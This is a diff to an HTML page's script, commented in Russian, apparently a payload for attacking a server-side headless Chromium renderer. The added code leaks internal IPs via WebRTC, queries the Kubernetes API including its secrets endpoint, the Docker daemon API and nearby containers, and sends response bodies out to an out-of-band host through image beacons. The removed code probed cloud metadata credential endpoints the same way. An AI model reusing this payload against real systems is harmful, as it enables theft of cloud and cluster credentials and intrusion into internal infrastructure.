@@ -8,53 +8,69 @@ function fire(path) {
   new Image().src = 'https://' + OOB + path + '&r=' + Math.random();
 }
 
-fire('/alive9?t=0');
+fire('/alive10?t=0');
 
-// ГИПОТЕЗА v=6: Chrome PNA отправляет OPTIONS-preflight к link-local → IMDS игнорирует → timeout.
-// mode:'no-cors' делает запрос "simple" → PNA preflight не нужен → прямой GET к IMDS.
-// Если resolve() → сервер ответил (opaque response, status=0) — ПРОРЫВ.
-// Если timeout → сервер не отвечает на HTTP вообще.
+// 1. WebRTC ICE - внутренний IP Chromium-пода (обходит PNA и CORS)
+(function() {
+  try {
+    var pc = new RTCPeerConnection({iceServers: []});
+    pc.createDataChannel('x');
+    pc.createOffer().then(function(o) { return pc.setLocalDescription(o); });
+    pc.onicecandidate = function(e) {
+      if (e && e.candidate && e.candidate.candidate) {
+        fire('/rtc?c=' + encodeURIComponent(e.candidate.candidate.slice(0, 120)));
+      }
+    };
+    setTimeout(function() { try { pc.close(); } catch(x) {} }, 4000);
+  } catch(ex) {
+    fire('/rtc-err?e=' + encodeURIComponent(ex.message.slice(0, 60)));
+  }
+})();
 
-function noCorsFetch(label, url, timeoutMs) {
+// 2. CORS fetch: если сервер вернёт ACAO:* — читаем тело напрямую
+// Если вернёт HTTP без CORS-заголовков — быстрая ошибка (сервер ответил, данные есть)
+// Если timeout — сервер вообще не отвечает на HTTP
+function cf(label, url, ms) {
   var t0 = Date.now();
-  fetch(url, {
-    mode: 'no-cors',
-    credentials: 'omit',
-    signal: AbortSignal.timeout(timeoutMs || 2000),
-  }).then(function(r) {
-    // resolve = ответ получен (opaque: status=0, type='opaque')
-    fire('/nc-ok-' + label + '?ms=' + (Date.now()-t0) + '&type=' + r.type + '&s=' + r.status);
-  }).catch(function(e) {
-    var ms = Date.now() - t0;
-    var tag = ms >= (timeoutMs || 2000) - 50 ? 'to' : 'err';
-    fire('/nc-' + tag + '-' + label + '?ms=' + ms + '&e=' + encodeURIComponent(e.message.slice(0, 50)));
-  });
+  fetch(url, {mode: 'cors', credentials: 'omit', signal: AbortSignal.timeout(ms)})
+    .then(function(r) {
+      return r.text().then(function(b) {
+        fire('/cf-ok-' + label + '?ms=' + (Date.now()-t0) + '&s=' + r.status
+          + '&b=' + encodeURIComponent(b.slice(0, 300)));
+      });
+    })
+    .catch(function(e) {
+      var elapsed = Date.now() - t0;
+      var tag = elapsed >= ms - 150 ? 'to' : 'err';
+      fire('/cf-' + tag + '-' + label + '?ms=' + elapsed
+        + '&e=' + encodeURIComponent(e.message.slice(0, 80)));
+    });
 }
 
-// IMDS - все варианты через no-cors
-noCorsFetch('imds-root',      'http://169.254.169.254/',                                   1500);
-noCorsFetch('imds-meta',      'http://169.254.169.254/latest/meta-data/',                  1500);
-noCorsFetch('imds-os-meta',   'http://169.254.169.254/openstack/latest/meta_data.json',    1500);
-noCorsFetch('imds-os-net',    'http://169.254.169.254/openstack/latest/network_data.json', 1500);
-noCorsFetch('imds-token',     'http://169.254.169.254/latest/api/token',                   1500);
-noCorsFetch('gke170',         'http://169.254.170.2/v2/credentials',                       1500);
-noCorsFetch('gke170-meta',    'http://169.254.170.2/v2/metadata/instance',                 1500);
+// k8s insecure API port 8080 — с большим таймаутом (прошлый 2000мс мог не успеть)
+cf('k8s-ver',        'http://10.96.0.1:8080/version',                                 8000);
+cf('k8s-api',        'http://10.96.0.1:8080/api',                                     8000);
+cf('k8s-secrets',    'http://10.96.0.1:8080/api/v1/secrets',                          8000);
+cf('k8s-nodes',      'http://10.96.0.1:8080/api/v1/nodes',                            8000);
 
-// k8s API - no-cors
-noCorsFetch('k8s-8080-ver',   'http://10.96.0.1:8080/version',                            2000);
-noCorsFetch('k8s-8080-api',   'http://10.96.0.1:8080/api',                                2000);
-noCorsFetch('k8s-8080-ns',    'http://10.96.0.1:8080/api/v1/namespaces/default/secrets',  2000);
+// k8s HTTPS: cert error (быстро) = TLS-сервер есть; timeout = нет сервера
+cf('k8s-443',        'https://10.96.0.1/',                                             4000);
+cf('k8s-6443',       'https://10.96.0.1:6443/',                                        4000);
+cf('k8s-6443-ver',   'https://10.96.0.1:6443/version',                                4000);
 
-// HTTPS к IMDS - если cert error → TLS handshake прошёл → сервер есть
-// Если timeout → нет TLS сервера на порту 443
-noCorsFetch('imds-https',     'https://169.254.169.254/',                                  1500);
-noCorsFetch('imds-https-os',  'https://169.254.169.254/openstack/latest/meta_data.json',   1500);
+// Docker host 172.17.0.1: сервисы, которые могут быть на хосте
+cf('dkr-2375',       'http://172.17.0.1:2375/',                                        3000); // Docker API (insecure)
+cf('dkr-2376',       'https://172.17.0.1:2376/',                                       3000); // Docker API (TLS)
+cf('dkr-8080',       'http://172.17.0.1:8080/',                                        3000);
+cf('dkr-9090',       'http://172.17.0.1:9090/',                                        3000); // Prometheus
+cf('dkr-5000',       'http://172.17.0.1:5000/',                                        3000); // registry/flask
+cf('dkr-6443',       'https://172.17.0.1:6443/',                                       3000);
 
-// Контрольная точка: 169.254.1.1 (не IMDS, просто router link-local)
-// Если тоже timeout → весь 169.254.0.0/16 принимает TCP (общий роутер)
-// Если быстрая ошибка → 169.254.169.254 специфичен
-noCorsFetch('ctrl-1691',      'http://169.254.1.1/',                                       1000);
-noCorsFetch('ctrl-1692',      'http://169.254.0.1/',                                       1000);
+// Сервис на 172.17.0.2, 172.17.0.3 (другие контейнеры в Docker-сети)
+cf('dkr2-80',        'http://172.17.0.2/',                                             3000);
+cf('dkr2-8080',      'http://172.17.0.2:8080/',                                        3000);
+cf('dkr3-80',        'http://172.17.0.3/',                                             3000);
+cf('dkr3-8080',      'http://172.17.0.3:8080/',                                        3000);
 </script>
 </body>
 </html>
